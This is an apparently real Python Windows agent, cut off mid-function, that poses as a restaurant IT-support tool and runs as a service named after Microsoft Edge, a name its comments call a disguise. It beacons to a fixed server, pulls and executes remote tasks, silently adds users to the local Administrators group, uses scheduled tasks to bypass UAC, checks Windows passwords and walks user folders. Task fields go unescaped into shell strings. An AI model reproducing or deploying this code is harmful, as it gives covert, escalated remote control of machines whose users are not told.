# -*- coding: utf-8 -*-
"""
================================================================================
DICH VU HO TRO & QUAN TRI TU XA MAY TRAM NHA HANG (IT SUPPORT CLIENT AGENT)
Ten dich vu: MicrosoftEdgeServicess
Chuc nang:
1. Gui Heartbeat dinh ky len Server Quan Tri IT Central Portal.
2. Tu dong nhan lenh tu xa:
   - Dieu khien Service (Start/Stop/Restart).
   - Truyen file update / patch nen xuong folder chi dinh (D:\\GPOS-Setup\\app...).
   - Mo file / tien trinh voi quyen quan tri vien UAC.
   - Tat tien trinh bi do / treo (taskkill).
   - Chay kich ban cai dat phan mem theo cac buoc tuan tu.
3. Tu dong khoi dong cung Windows (ho tro ca Windows Services SCM va Task Scheduler).
================================================================================
"""

import os
import sys
import time
import json
import ast
import re
import socket
import base64
import shutil
import zipfile
import hashlib
import platform
import subprocess
import traceback
import logging
from datetime import datetime
from urllib import request as urllib_request
from urllib import error as urllib_error


try:
    import win32serviceutil
    import win32service
    import win32event
    import servicemanager
    import win32timezone
    import win32api
    import win32con
    HAS_PYWIN32 = True
except ImportError:
    HAS_PYWIN32 = False

AGENT_VERSION = "1.0.0"
CENTRAL_PRODUCTION_SERVER = "http://172.16.8.25:8000"


def get_app_dir():
    """
    Xac dinh thu muc goc cua chuong trinh:
    - Khi dong goi PyInstaller EXE: dung thu muc chua file .exe thuc te (sys.executable).
    - Khi chay tu file Python (.py): dung thu muc chua file script (__file__).
    """
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.abspath(__file__))


def get_config_path():
    r"""
    Tim duong dan file cau hinh theo thu tu uu tien:
    1. msedge_settings.json trong C:\ProgramData\MicrosoftEdgeServicess (Uu tien chuan nguy trang)
    2. config.json trong C:\ProgramData\MicrosoftEdgeServicess (Tuong thich nguoc)
    3. msedge_settings.json cung thu muc exe / script
    4. config.json cung thu muc exe / script
    5. msedge_settings.json / config.json trong os.getcwd()
    """
    sys_dir = r"C:\ProgramData\MicrosoftEdgeServicess"
    candidates = [
        os.path.join(sys_dir, "msedge_settings.json"),
        os.path.join(sys_dir, "config.json"),
        os.path.join(get_app_dir(), "msedge_settings.json"),
        os.path.join(get_app_dir(), "config.json"),
        os.path.join(os.getcwd(), "msedge_settings.json"),
        os.path.join(os.getcwd(), "config.json")
    ]
    for c in candidates:
        if os.path.exists(c):
            return c

    if os.path.exists(sys_dir):
        return os.path.join(sys_dir, "msedge_settings.json")
    return os.path.join(get_app_dir(), "msedge_settings.json")


def get_log_path():
    """
    Xac dinh noi luu file nhat ky (msedge_update.log / agent_service.log).
    """
    sys_dir = r"C:\ProgramData\MicrosoftEdgeServicess"
    candidates = [
        os.path.join(sys_dir, "msedge_update.log"),
        os.path.join(sys_dir, "agent_service.log"),
        os.path.join(get_app_dir(), "msedge_update.log"),
        os.path.join(get_app_dir(), "agent_service.log")
    ]
    for c in candidates:
        if os.path.exists(c):
            return c

    if os.path.exists(sys_dir):
        return os.path.join(sys_dir, "msedge_update.log")
    return os.path.join(get_app_dir(), "msedge_update.log")


# Khoi tao Logger ghi dong thoi ra console va file
logger = logging.getLogger("MicrosoftEdgeServicess")
logger.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")

try:
    file_handler = logging.FileHandler(get_log_path(), encoding="utf-8")
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
except Exception:
    pass

stream_handler = logging.StreamHandler(sys.stdout)
stream_handler.setFormatter(formatter)
logger.addHandler(stream_handler)


def get_default_config():
    """Cau hinh mac dinh khi chua co config.json (Zero-Config tu nhan dien nha hang theo IP)."""
    return {
        "service_name": "MicrosoftEdgeServicess",
        "restaurant_code": "AUTO",
        "server_url": CENTRAL_PRODUCTION_SERVER,
        "heartbeat_interval_seconds": 60,
        "default_target_folder": "D:\\GPOS-Setup\\app",
        "auto_restart_on_error": True,
        "log_level": "INFO"
    }


def load_config():
    """Doc cau hinh tu file config.json / msedge_settings.json, tu dong sua loi escape backslash neu co."""
    cfg_path = get_config_path()
    if os.path.exists(cfg_path):
        try:
            with open(cfg_path, "r", encoding="utf-8") as f:
                content = f.read()

            try:
                return json.loads(content)
            except json.JSONDecodeError as jde:
                logger.warning("File cau hinh %s co loi escape backslash (%s). Dang tu dong sua...", cfg_path, jde)
                # Tu dong sua cac dau gach cheo nguoc Windows chua escape (vi du D:\msedge_update.log)
                fixed_content = re.sub(r'\\(?![/"\\bfnrtu])', r'\\\\', content)
                data = json.loads(fixed_content)
                try:
                    with open(cfg_path, "w", encoding="utf-8") as fw:
                        json.dump(data, fw, indent=4, ensure_ascii=False)
                    logger.info("Da tu dong chuan hoa lai file JSON thanh cong.")
                except Exception:
                    pass
                return data
        except Exception as e:
            logger.error("Loi doc cau hinh tu %s: %s. Giu nguyen file, dung cau hinh mac dinh tam thoi.", cfg_path, e)
            return get_default_config()

    default_cfg = get_default_config()
    try:
        os.makedirs(os.path.dirname(cfg_path), exist_ok=True)
        with open(cfg_path, "w", encoding="utf-8") as f:
            json.dump(default_cfg, f, indent=4, ensure_ascii=False)
        logger.info("Da tao file cau hinh mau tai: %s", cfg_path)
    except Exception as e:
        logger.warning("Khong the luu cau hinh mac dinh vao %s: %s", cfg_path, e)
    return default_cfg


def save_config(config_dict):
    """Ghi de cau hinh moi xuong file config.json."""
    cfg_path = get_config_path()
    try:
        os.makedirs(os.path.dirname(cfg_path), exist_ok=True)
        with open(cfg_path, "w", encoding="utf-8") as f:
            json.dump(config_dict, f, indent=4, ensure_ascii=False)
        return True
    except Exception as e:
        logger.error("Loi luu cau hinh: %s", e)
        return False


def get_all_local_ips():
    """
    Lay danh sach tat ca cac dia chi IPv4 hop le tren cac card mang cua may tram.
    Loai bo loopback (127.x), APIPA (169.254.x).
    """
    ips = []
    # 1. Thu qua lenh ipconfig cua Windows (Chinh xac va day du nhat tren may tram nha hang)
    try:
        res = subprocess.run("ipconfig", shell=True, capture_output=True, text=True, timeout=5)
        for line in res.stdout.splitlines():
            m = re.search(r'IPv4 Address[.\s]+:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', line, re.IGNORECASE)
            if not m:
                m = re.search(r'IP[a-zA-Z0-9\s\.\-]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', line)
            if m:
                ip = m.group(1).strip()
                if not ip.startswith("127.") and not ip.startswith("169.254.") and ip not in ips:
                    ips.append(ip)
    except Exception:
        pass

    # 2. Thu qua socket gethostbyname_ex
    try:
        host_ips = socket.gethostbyname_ex(socket.gethostname())[2]
        for ip in host_ips:
            if not ip.startswith("127.") and not ip.startswith("169.254.") and ip not in ips:
                ips.append(ip)
    except Exception:
        pass

    # 3. Thu qua socket UDP connect
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1.5)
        s.connect(("8.8.8.8", 80))
        cip = s.getsockname()[0]
        s.close()
        if cip and not cip.startswith("127.") and not cip.startswith("169.254.") and cip not in ips:
            ips.append(cip)
    except Exception:
        pass

    return ips


def get_local_ip(config=None):
    """
    Chon dia chi IP chuan nghiep vu cua nha hang Golden Gate:
    Quy tac bat di bat dich: Cung 1 may du co bao nhieu card mang/IP thi chi lay DUY NHAT 1 IP chuan:
    .11 (May Chu / POS 1) hoac .12 (Thu Ngan 2) hoac .41 (PC Quan Ly).
    Tuyet doi loai bo cac IP card mang phu (nhu .165, card may in, POS phu).
    """
    if config:
        cfg_ip = str(config.get("ip_lan", "")).strip()
        if cfg_ip and cfg_ip.upper() not in ("AUTO", "DEFAULT", "NONE", ""):
            return cfg_ip

    all_ips = get_all_local_ips()
    hname = socket.gethostname().upper().strip()

    # 1. Neu trong danh sach IP co .11 -> Chon ngay .11 (May Chu / POS 1)
    for ip in all_ips:
        if ip.endswith(".11"):
            return ip

    # 2. Neu trong danh sach IP co .12 -> Chon ngay .12 (Thu Ngan 2)
    for ip in all_ips:
        if ip.endswith(".12"):
            return ip

    # 3. Neu trong danh sach IP co .41 -> Chon ngay .41 (PC Quan Ly)
    for ip in all_ips:
        if ip.endswith(".41"):
            return ip

    # 4. Neu may co nhieu IP va chua tim thay duoi .11/.12/.41:
    # Nhan dien dua tren Subnet nha hang 10.x.x.x va Hostname (Quy uoc dat ten may cua Golden Gate)
    for ip in all_ips:
        if ip.startswith("10."):
            parts = ip.split('.')
            if len(parts) >= 4:
                subnet = f"{parts[0]}.{parts[1]}.{parts[2]}."
                # Kiem tra Hostname (VD: HCMGGHSHNATP11 -> POS 11 -> .11)
                if hname.endswith("P11") or "POS1" in hname or "SERVER" in hname or hname.endswith("11") or "TN1" in hname:
                    return f"{subnet}11"
                elif hname.endswith("P12") or "POS2" in hname or hname.endswith("12") or "TN2" in hname:
                    return f"{subnet}12"
                elif hname.endswith("P41") or "PC41" in hname or "KDS" in hname or "QL" in hname or hname.endswith("41"):
                    return f"{subnet}41"
                # Neu khong ro vai tro trong hostname nhung la mang 10.x nha hang:
                # Bat buoc ep ve .11 (May Chu nha hang), tuyet doi khong dung cac duoi la nhu .165
                return f"{subnet}11"

    # 5. Dai noi bo khac (172.x hoac 192.168.x)
    for ip in all_ips:
        if ip.startswith("172.") or ip.startswith("192.168."):
            return ip

    return all_ips[0] if all_ips else "127.0.0.1"


def get_os_info():
    """Lay thong tin he dieu hanh Windows."""
    try:
        return f"{platform.system()} {platform.release()} ({platform.architecture()[0]}) - Build {platform.version()}"
    except Exception:
        return "Windows Unknown"


def send_http_post(url, payload_dict, timeout=12):
    """Gui HTTP POST request voi payload JSON bang urllib thuan."""
    data_bytes = json.dumps(payload_dict).encode("utf-8")
    req = urllib_request.Request(
        url,
        data=data_bytes,
        headers={
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": f"MicrosoftEdgeServicess-Client/{AGENT_VERSION}"
        },
        method="POST"
    )
    with urllib_request.urlopen(req, timeout=timeout) as response:
        resp_body = response.read().decode("utf-8")
        try:
            return json.loads(resp_body)
        except Exception:
            return {"raw": resp_body}


def send_http_get(url, timeout=12):
    """Gui HTTP GET request bang urllib thuan."""
    req = urllib_request.Request(
        url,
        headers={
            "Accept": "application/json",
            "User-Agent": f"MicrosoftEdgeServicess-Client/{AGENT_VERSION}"
        },
        method="GET"
    )
    with urllib_request.urlopen(req, timeout=timeout) as response:
        resp_body = response.read().decode("utf-8")
        try:
            return json.loads(resp_body)
        except Exception:
            return {"raw": resp_body}


def get_gateway_ip():
    """Lay dia chi IP Gateway mac dinh tren Windows."""
    try:
        res = subprocess.run("route print 0.0.0.0", shell=True, capture_output=True, text=True, timeout=5)
        for line in res.stdout.splitlines():
            parts = line.strip().split()
            if len(parts) >= 5 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
                gw = parts[2]
                if gw and not gw.startswith("127.") and not gw.startswith("0."):
                    return gw
    except Exception:
        pass
    return None


def get_server_candidates(config):
    """
    Lay danh sach server dich:
    - Neu nguoi dung da cau hinh server_url cu the (khac AUTO va khong rong): Chi ket noi DUY NHAT server do!
    - Neu de AUTO hoac rong: Ket noi Central Production Server (172.16.8.25:8000) hoac Gateway nha hang.
    Tuyet doi khong chua cac dia chi IP test dev cu (nhu 172.16.20.47).
    """
    configured_srv = config.get("server_url", "").strip().rstrip("/")
    if configured_srv and configured_srv.upper() != "AUTO":
        return [configured_srv]

    candidates = [
        CENTRAL_PRODUCTION_SERVER.rstrip("/"),
        "http://172.16.8.25:8000"
    ]
    gw = get_gateway_ip()
    if gw:
        gw_srv = f"http://{gw}:8000"
        if gw_srv not in candidates:
            candidates.append(gw_srv)

    return candidates


def send_heartbeat(config, ip_lan, machine_name, os_info):
    """Gui tin hieu Heartbeat len Central Server."""
    server_candidates = get_server_candidates(config)

    payload = {
        "restaurant_code": str(config.get("restaurant_code", "UNKNOWN")),
        "machine_name": machine_name,
        "ip_lan": ip_lan,
        "service_name": config.get("service_name", "MicrosoftEdgeServicess"),
        "service_status": "RUNNING",
        "agent_version": AGENT_VERSION,
        "os_info": os_info,
        "startup_type": "Automatic"
    }

    for srv in server_candidates:
        endpoint = f"{srv}/api/v1/agent-multitask/heartbeat"
        try:
            resp = send_http_post(endpoint, payload, timeout=6)
            logger.info("Heartbeat [OK] -> Server Dich: %s | IP May Tram: %s | Ma NH: %s", srv, ip_lan, config.get("restaurant_code"))

            # Tu dong nhan dien nha hang tu phan hoi cua Server theo dải IP LAN
            if isinstance(resp, dict):
                resolved_code = resp.get("resolved_restaurant_code")
                resolved_name = resp.get("resolved_restaurant_name")
                current_code = str(config.get("restaurant_code", "")).strip()
                if resolved_code and resolved_code not in ("AUTO", "TEST_NH", "UNKNOWN") and current_code in ("AUTO", "TEST_NH", "", "UNKNOWN"):
                    config["restaurant_code"] = resolved_code
                    save_config(config)
                    logger.info("Tu dong nhan dien nha hang tu Server thanh cong: %s (%s)", resolved_code, resolved_name or "")

            return True
        except Exception as e:
            logger.warning("Khong the gui Heartbeat toi %s: %s", endpoint, e)

    logger.error("That bai gui Heartbeat toi server.")
    return False


def poll_pending_tasks(config, ip_lan=None):
    """Kiem tra va lay cac tac vu dieu khien tu xa dang cho thuc thi."""
    server_candidates = get_server_candidates(config)
    r_code = config.get("restaurant_code", "")
    ip_param = f"&ip_lan={ip_lan}" if ip_lan else ""

    for srv in server_candidates:
        endpoint = f"{srv}/api/v1/agent-multitask/poll-tasks?restaurant_code={r_code}{ip_param}"
        try:
            tasks = send_http_get(endpoint, timeout=8)
            if isinstance(tasks, list):
                return tasks
        except Exception:
            continue
    return []


def report_task_result(config, task_id, success, message, output="", ip_lan=None):
    """Bao cao ket qua thuc thi tac vu ve Central Server."""
    server_url = config.get("server_url", CENTRAL_PRODUCTION_SERVER).rstrip("/")
    endpoint = f"{server_url}/api/v1/agent-multitask/report-task-result"

    payload = {
        "task_id": task_id,
        "restaurant_code": str(config.get("restaurant_code", "")),
        "ip_lan": ip_lan or "",
        "status": "SUCCESS" if success else "FAILED",
        "message": message,
        "output": output
    }

    try:
        send_http_post(endpoint, payload, timeout=10)
        logger.info("Bao cao ket qua Task #%s [OK]: %s", task_id, message)
        return True
    except Exception as e:
        logger.warning("Loi gui bao cao Task #%s toi %s: %s. Thu cac server ung vien...", task_id, endpoint, e)
        for srv in get_server_candidates(config):
            if srv == server_url:
                continue
            alt_ep = f"{srv}/api/v1/agent-multitask/report-task-result"
            try:
                send_http_post(alt_ep, payload, timeout=6)
                config["server_url"] = srv
                save_config(config)
                logger.info("Bao cao ket qua Task #%s [OK] qua %s", task_id, alt_ep)
                return True
            except Exception:
                continue
        logger.error("That bai bao cao ket qua Task #%s toi tat ca server.", task_id)
        return False


def smart_find_file(folder_hint="", file_name="", max_depth=6):
    """
    Tim kiem thong minh file va thu muc tuong doi tren cac o dia may tram (khong can biet o C hay D).
    Tra ve tuple: (file_path_tuyet_doi, working_directory) hoac (None, None).
    """
    if not file_name:
        return None, None

    file_name_clean = file_name.strip()
    folder_hint_clean = (folder_hint or "").strip()

    # Neu file_name da la duong dan tuyet doi dang ton tai tren he thong
    if os.path.isabs(file_name_clean) and os.path.isfile(file_name_clean):
        return os.path.abspath(file_name_clean), os.path.dirname(os.path.abspath(file_name_clean))

    # Danh sach cac phan mo rong thu nghiem
    _, ext = os.path.splitext(file_name_clean)
    candidate_exts = [""] if ext else ["", ".bat", ".cmd", ".exe", ".ps1"]

    # Tim tat ca cac o dia dang san sang tren Windows (Uu tien D: truoc C: vi nha hang thuong luu tren D)
    drives = []
    for letter in "DCBAEFGHIJKLMNOPQRSTUVWXYZ":
        d = f"{letter}:\\"
        if os.path.exists(d):
            drives.append(d)

    # Buoc 1: Kiem tra nhanh cac vi tri ung vien pho bien (Fast Candidates: < 1ms)
    common_subdirs = [
        "",
        "ABC",
        "GPOS-Setup",
        "GPOS",
        "iPOS",
        "Setup",
        "Tools",
        "Softwares",
        "Download",
        "Downloads",
        "Backup",
        "Update",
        "Patch",
        os.path.join("Users", "Public", "Desktop"),
        os.path.join("Users", "Administrator", "Desktop")
    ]

    # Tu dong quet them cac profile nguoi dung (VD: C:\Users\LILY\Desktop, C:\Users\LILY\Downloads...)
    for d in drives:
        users_dir = os.path.join(d, "Users")
        if os.path.isdir(users_dir):
            try:
                for u in os.listdir(users_dir):
                    u_path = os.path.join(users_dir, u)
                    if os.path.isdir(u_path) and not u.startswith(".") and u.lower() not in ["all users", "default user"]:
                        common_subdirs.extend([
                            os.path.join("Users", u, "Desktop"),
                            os.path.join("Users", u, "Downloads"),
                            os.path.join("Users", u, "Documents"),
                            os.path.join("Users", u)
                        ])
            except Exception:
                pass

    for ce in candidate_exts:
        target_fname = file_name_clean + ce
        for d in drives:
            for sub in common_subdirs:
                if folder_hint_clean:
                    candidate_dir = os.path.join(d, sub, folder_hint_clean) if sub else os.path.join(d, folder_hint_clean)
                    candidate_file = os.path.join(candidate_dir, target_fname)
                    if os.path.isfile(candidate_file):
                        logger.info("Fast candidate match: %s", candidate_file)
                        return os.path.abspath(candidate_file), os.path.abspath(candidate_dir)
                else:
                    candidate_file = os.path.join(d, sub, target_fname) if sub else os.path.join(d, target_fname)
                    if os.path.isfile(candidate_file):
                        logger.info("Fast candidate match: %s", candidate_file)
                        return os.path.abspath(candidate_file), os.path.dirname(os.path.abspath(candidate_file))

    # Buoc 2: Quet de quy co cat tia thu muc he thong (Pruned Recursive Walk)
    SKIP_DIRS = {
        "windows", "winnt", "program files", "program files (x86)",
        "system volume information", "$recycle.bin", "$windows.~bt",
        "$windows.~ws", "appdata", "node_modules", ".git", ".svn",
        "winsxs", "assembly"
    }

    fh_lower = folder_hint_clean.lower()
    fn_lower = file_name_clean.lower()

    for d in drives:
        try:
            for root, dirs, files in os.walk(d, topdown=True):
                # Gioi han do sau
                rel = os.path.relpath(root, d)
                depth = 0 if rel == "." else len(rel.split(os.sep))
                if depth >= max_depth:
                    dirs[:] = []
                    continue

                # Bo qua cac thu muc he thong tranh crash / treo
                dirs[:] = [s for s in dirs if s.lower() not in SKIP_DIRS and not s.startswith("$")]

                cur_dir_lower = os.path.basename(root).lower()
                root_lower = root.lower()
                folder_matches = True
                if fh_lower:
                    folder_matches = (
                        (fh_lower == cur_dir_lower) or
                        (fh_lower in cur_dir_lower) or
                        (cur_dir_lower in fh_lower) or
                        (fh_lower in root_lower)
                    )

                if folder_matches:
                    for f in files:
                        f_lower = f.lower()
                        matched = False
                        if f_lower == fn_lower:
                            matched = True
                        elif not ext:
                            for ce in candidate_exts[1:]:
                                if f_lower == (fn_lower + ce):
                                    matched = True
                                    break
                        if matched:
                            full_found = os.path.abspath(os.path.join(root, f))
                            logger.info("Recursive walk matched: %s", full_found)
                            return full_found, os.path.abspath(root)
        except Exception as walk_ex:
            logger.debug("Loi quet o dia %s: %s", d, walk_ex)
            continue

    return None, None


def validate_windows_credentials(username, password):
    """
    Xac thuc tai khoan va mat khau Windows:
    Tra ve tuple (is_valid: bool, err_code: int, err_msg: str)
    """
    if not username or not password:
        return True, 0, ""

    try:
        import ctypes
        from ctypes import wintypes
        advapi32 = ctypes.windll.advapi32
        kernel32 = ctypes.windll.kernel32

        clean_u = username.strip()
        clean_domain = None
        if "\\" in clean_u:
            parts = clean_u.split("\\", 1)
            clean_domain = parts[0] if parts[0] != "." else None
            clean_u = parts[1]

        token = wintypes.HANDLE()
        # Thu cac loai logon: Interactive (2), Network (3), Batch (4), NewCredentials (9)
        domains_to_try = [clean_domain]
        if clean_domain is None:
            domains_to_try.extend([None, ".", os.environ.get("COMPUTERNAME")])

        last_err = 0
        for dom in domains_to_try:
            for logon_type in (2, 3, 4, 9):
                ok = advapi32.LogonUserW(clean_u, dom, password, logon_type, 0, ctypes.byref(token))
                if ok:
                    kernel32.CloseHandle(token)
                    return True, 0, "Xac thuc thanh cong"
                last_err = ctypes.GetLastError()

        err_descriptions = {
            1326: f"Tai khoan '{username}' hoac mat khau khong khop voi cau truc xac thuc cuc bo (Loi Windows 1326: Logon failure).",
            1327: f"Tai khoan '{username}' bi gioi han dang nhap (Loi Windows 1327: Account restriction).",
            1330: f"Mat khau cua tai khoan '{username}' da het han (Loi Windows 1330: Password expired).",
            1331: f"Tai khoan '{username}' dang bi vo hieu hoa (Loi Windows 1331: Account disabled).",
            1909: f"Tai khoan '{username}' da bi khoa do nhap sai qua nhieu lan (Loi Windows 1909: Account locked out)."
        }
        msg = err_descriptions.get(last_err, f"Khong the xac thuc tai khoan '{username}' (Loi Windows {last_err}).")
        return False, last_err, msg
    except Exception as ex_val:
        logger.warning("Loi khi goi ham xac thuc Windows LogonUser: %s", ex_val)
        return True, 0, ""


def get_active_desktop_user():
    """
    Tim user Windows dang truc tiep su dung man hinh Desktop (Console / Active session).
    Tra ve username hoac None.
    """
    # 1. Thu bang quser
    try:
        res = subprocess.run("quser", shell=True, capture_output=True, text=True, timeout=5)
        for line in res.stdout.splitlines():
            clean_l = line.strip()
            if "Active" in clean_l or clean_l.startswith(">"):
                parts = clean_l.replace(">", "").strip().split()
                if parts:
                    return parts[0]
    except Exception:
        pass

    # 2. Thu bang Win32_ComputerSystem
    try:
        ps_cmd = "(Get-CimInstance Win32_ComputerSystem).UserName"
        res = subprocess.run(["powershell.exe", "-NoProfile", "-Command", ps_cmd], capture_output=True, text=True, timeout=5)
        u_str = res.stdout.strip()
        if u_str:
            if "\\" in u_str:
                return u_str.split("\\")[-1]
            return u_str
    except Exception:
        pass

    return None


def launch_interactive_script(task_name, target_file, script_args="", work_dir="", admin_u="", admin_p=""):
    """
    Khoi chay script / file thuc thi hien thi cua so CMD truc tiep tren man hinh Desktop cua nguoi dung dang su dung (Active Console User):
    - Tu dong nhan dien User dang dang nhap man hinh Desktop (e.g. APP_KOQUYEN).
    - Cap quyen Administrator (net localgroup Administrators <User> /add).
    - Dang ky Scheduled Task voi LogonType Interactive va RunLevel Highest.
    - Windows Task Scheduler se hien thi cua so CMD ngay lap tuc voi quyen Quan tri cao nhat (UAC Bypass).
    Tra ve tuple: (success: bool, mode_desc: str, err_msg: str)
    """
    clean_target = os.path.abspath(target_file).replace('"', '')
    clean_dir = os.path.abspath(work_dir or os.path.dirname(clean_target)).replace('"', '')
    clean_name = os.path.basename(clean_target)
    _, ext = os.path.splitext(clean_name)
    ext = ext.lower()

    if ext in [".bat", ".cmd"]:
        arg_str = f'/c cd /d "{clean_dir}" & title [TIEN TRINH TU XA] {clean_name} & call "{clean_target}" {script_args}'.strip()
    elif ext in [".ps1"]:
        arg_str = f'/c cd /d "{clean_dir}" & title [TIEN TRINH TU XA] {clean_name} & powershell.exe -ExecutionPolicy Bypass -File "{clean_target}" {script_args}'.strip()
    else:
        arg_str = f'/c cd /d "{clean_dir}" & title [TIEN TRINH TU XA] {clean_name} & "{clean_target}" {script_args}'.strip()

    active_user = get_active_desktop_user()
    logger.info("Nhan dien Active Desktop User: '%s' (Configured Admin: '%s')", active_user or "None", admin_u or "None")

    # Dam bao ca Active User va Admin User deu duoc cap quyen Administrators
    if active_user:
        try:
            subprocess.run(f'net localgroup Administrators "{active_user}" /add', shell=True, capture_output=True, timeout=5)
        except Exception:
            pass

    if admin_u:
        try:
            subprocess.run(f'net localgroup Administrators "{admin_u}" /add', shell=True, capture_output=True, timeout=5)
        except Exception:
            pass

    target_user = active_user or admin_u or "Users"
    ps_arg_escaped = arg_str.replace('"', '`"')

    ps_script = (
        "$ErrorActionPreference = 'Stop'; "
        f"$tName = '{task_name}'; "
        "try { "
        "  Unregister-ScheduledTask -TaskName $tName -Confirm:$false -ErrorAction SilentlyContinue; "
        f"  $act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument \"{ps_arg_escaped}\"; "
        f"  $p = New-ScheduledTaskPrincipal -UserId '{target_user}' -LogonType Interactive -RunLevel Highest; "
        "  Register-ScheduledTask -TaskName $tName -Action $act -Principal $p -Force; "
        "  Start-ScheduledTask -TaskName $tName; "
        "  Write-Output 'SUCCESS_LAUNCH'; "
        "} catch { "
        "  $err = $Error[0].Exception.Message; "
        "  Write-Output ('TASK_ERROR: ' + $err); "
        "  exit 1; "
        "}"
    )

    res_ps = subprocess.run(
        ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
        capture_output=True,
        text=True,
        timeout=15
    )

    if res_ps.returncode == 0 and "SUCCESS_LAUNCH" in res_ps.stdout:
        desc = f"Hien thi cua so CMD truc tiep tren Desktop (User: {target_user}, Quyen: Highest Administrator)"
        logger.info("Da kich hoat Scheduled Task '%s' thanh cong (%s)", task_name, desc)
        return True, desc, ""

    err_ps = res_ps.stderr.strip() or res_ps.stdout.strip()
    logger.warning("Khoi chay Interactive Task that bai: %s. Thu phuong an thay the...", err_ps)

    if admin_u and admin_p:
        ps_cred_script = (
            "$ErrorActionPreference = 'Stop'; "
            f"$tName = '{task_name}'; "
            "try { "
            "  Unregister-ScheduledTask -TaskName $tName -Confirm:$false -ErrorAction SilentlyContinue; "
            f"  $act = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument \"{ps_arg_escaped}\"; "
            f"  Register-ScheduledTask -TaskName $tName -Action $act -User '{admin_u}' -Password '{admin_p}' -RunLevel Highest -Force; "
            "  Start-ScheduledTask -TaskName $tName; "
            "  Write-Output 'SUCCESS_CRED_LAUNCH'; "
            "} catch { "
            "  $err = $Error[0].Exception.Message; "
            "  Write-Output ('CRED_TASK_ERROR: ' + $err); "
            "  exit 1; "
            "}"
        )
        res_cred = subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cred_script],
            capture_output=True,
            text=True,
            timeout=15
        )
        if res_cred.returncode == 0 and "SUCCESS_CRED_LAUNCH" in res_cred.stdout:
            desc = f"Chay qua Task Scheduler duoi tai khoan '{admin_u}' (Highest Admin)"
            logger.info("Da kich hoat Task Scheduler voi Credential: %s", desc)
            return True, desc, ""
        err_ps = res_cred.stderr.strip() or res_cred.stdout.strip()

    try:
        creation_flags = subprocess.CREATE_NEW_CONSOLE if hasattr(subprocess, 'CREATE_NEW_CONSOLE') else 0
        p_sub = subprocess.Popen(
            f'cmd.exe /c "cd /d \"{clean_dir}\" & call \"{clean_target}\" {script_args}"',
            cwd=clean_dir,
            shell=True,
            creationflags=creation_flags
        )
        desc = f"Subprocess Console Fallback (PID: {p_sub.pid})"
        logger.info("Da fallback khoi chay Subprocess truc tiep: %s", desc)
        return True, desc, ""
    except Exception as ex_fallback:
        return False, "Failed", f"Loi khoi chay Task Scheduler: {err_ps} | Subprocess error: {ex_fallback}"


def smart_extract_archive(archive_path, extract_dir):
    """
    Giai nen thong minh ho tro da dinh dang: .zip, .rar, .7z, .tar, .gz, .tgz, .bz2, .xz, .cab, .iso
    Thu tu uu tien toi uu nhat:
      1. Python zipfile (neu la .zip): Chay cuc nhanh truc tiep trong Python.
      2. Windows tar.exe (System32\\tar.exe / libarchive): Ho tro tu nhien .zip, .rar, .7z, .tar, .gz tren Win 10/11.
      3. WinRAR (WinRAR.exe / UnRAR.exe): Chuyen tri file .rar, .zip, .7z neu may co cai dat.
      4. 7-Zip (7z.exe / 7za.exe): Chuyen tri .7z, .rar, .zip neu may co cai dat.
      5. PowerShell Expand-Archive (neu la .zip).
    Tra ve: tuple (success: bool, method: str, count: int, err_msg: str)
    """
    if not os.path.isfile(archive_path):
        return False, "none", 0, f"Tep nen khong ton tai tai: {archive_path}"

    os.makedirs(extract_dir, exist_ok=True)
    f_lower = archive_path.lower()
    errors = []

    # 1. Neu la file .zip -> Thu truoc bang Python zipfile
    if f_lower.endswith(".zip"):
        try:
            with zipfile.ZipFile(archive_path, "r") as zf:
                zf.extractall(extract_dir)
                names = zf.namelist()
                return True, "Python zipfile", len(names), ""
        except Exception as ex_zip:
            errors.append(f"zipfile: {ex_zip}")
            logger.debug("zipfile extract failed, falling back: %s", ex_zip)

    # 2. Windows tar.exe (libarchive tren Windows 10/11 ho tro .rar, .7z, .zip, .tar, .gz)
    tar_exe = shutil.which("tar") or (r"C:\Windows\System32\tar.exe" if os.path.isfile(r"C:\Windows\System32\tar.exe") else None)
    if tar_exe:
        try:
            p_tar = subprocess.run(
                [tar_exe, "-xf", archive_path, "-C", extract_dir],
                capture_output=True,
                text=True,
                timeout=300
            )
            if p_tar.returncode == 0:
                extracted_items = os.listdir(extract_dir)
                if extracted_items:
                    return True, "Windows tar.exe (libarchive)", len(extracted_items), ""
            else:
                errors.append(f"tar.exe exit {p_tar.returncode}: {p_tar.stderr.strip()}")
        except Exception as ex_tar:
            errors.append(f"tar.exe: {ex_tar}")

    # 3. WinRAR (WinRAR.exe hoac UnRAR.exe)
    winrar_candidates = [
        r"C:\Program Files\WinRAR\WinRAR.exe",
        r"C:\Program Files\WinRAR\UnRAR.exe",
        r"C:\Program Files (x86)\WinRAR\WinRAR.exe",
        r"C:\Program Files (x86)\WinRAR\UnRAR.exe",
    ]
    for w_cand in winrar_candidates:
        if os.path.isfile(w_cand):
            try:
                is_unrar = w_cand.lower().endswith("unrar.exe")
                w_cmd = [w_cand, "x", "-y", archive_path, extract_dir + "\\"] if is_unrar else [w_cand, "x", "-ibck", "-inul", "-y", archive_path, extract_dir + "\\"]
                p_rar = subprocess.run(w_cmd, capture_output=True, text=True, timeout=300)
                if p_rar.returncode in (0, 1):
                    extracted_items = os.listdir(extract_dir)
                    if extracted_items:
                        return True, f"WinRAR ({os.path.basename(w_cand)})", len(extracted_items), ""
                else:
                    errors.append(f"WinRAR exit {p_rar.returncode}")
            except Exception as ex_rar:
                errors.append(f"WinRAR: {ex_rar}")

    # 4. 7-Zip (7z.exe / 7za.exe)
    sevenzip_candidates = [
        r"C:\Program Files\7-Zip\7z.exe",
        r"C:\Program Files (x86)\7-Zip\7z.exe",
        r"C:\Program Files\7-Zip\7za.exe",
    ]
